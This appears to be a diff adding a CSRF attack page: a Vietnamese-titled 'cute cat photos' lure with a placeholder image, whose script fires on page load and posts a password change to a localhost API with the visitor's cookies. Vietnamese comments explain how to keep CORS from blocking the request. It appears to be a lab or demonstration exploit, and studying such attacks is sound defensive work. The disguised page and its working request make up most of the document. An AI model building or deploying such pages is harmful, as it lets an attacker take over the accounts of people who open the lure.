@@ -1,0 +1,29 @@
+<body>
+
+<h1>Xem ảnh mèo siêu dễ thương</h1>
+
+<img
+    src="https://picsum.photos/400/300"
+>
+
+<script>
+        window.onload = async () => {
+            // Sử dụng fetch để ép trình duyệt gửi kèm Cookie (credentials: 'include')
+            try {
+                const response = await fetch('http://localhost:5001/api/change-password', {
+                    method: 'POST',
+                    headers: {
+                        // Lưu ý: Không dùng Custom Header ở đây vì sẽ bị CORS chặn trước khi kịp gửi cookie
+                        'Content-Type': 'application/json' 
+                    },
+                    body: JSON.stringify({ password: 'hackedsuc123' }),
+                    credentials: 'include' // BẮT BUỘC: Cho phép gửi kèm cookie cross-origin
+                });
+                console.log("Attack triggered!");
+            } catch (err) {
+                console.error("Lỗi gửi request:", err);
+            }
+        };
+    </script>
+
+</body>
